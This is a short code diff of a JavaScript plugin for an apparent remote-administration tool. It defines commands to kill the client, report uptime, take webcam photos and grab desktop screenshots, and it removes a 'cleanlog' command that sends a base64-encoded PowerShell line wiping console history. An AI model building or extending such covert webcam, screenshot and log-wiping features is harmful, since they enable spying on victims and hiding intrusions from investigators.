@@ -5,37 +5,29 @@
         type: 'client',
         description: 'A client plugin to manage the remote client.',
         commands: {
-            'die': {
+            die: {
                 name: 'die',
                 method: 'execute',
                 description: 'Kills the client process.',
                 handler: () => 'di'
             },
-            'up': {
+            up: {
                 name: 'up',
                 method: 'execute',
                 description: 'Gets the client uptime.',
                 handler: () => 'up'
             },
-            'webcam': {
+            webcam: {
                 name: 'webcam',
                 method: 'execute',
                 description: 'Returns a webcam photo using the default camera.',
                 handler: () => 'wc'
             },
-            'screenshot': {
+            screenshot: {
                 name: 'screenshot',
                 method: 'execute',
                 description: 'Returns a desktop screenshot of the client.',
                 handler: () => 'ss'
-            },
-            'cleanlog': {
-                name: 'cleanlog',
-                method: 'payload-ps',
-                description: 'Cleans the powershell history and logs',
-                handler: () => {
-                    return Buffer.from(`Clear-History | [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()`).toString('base64');
-                }
             }
         }
     };
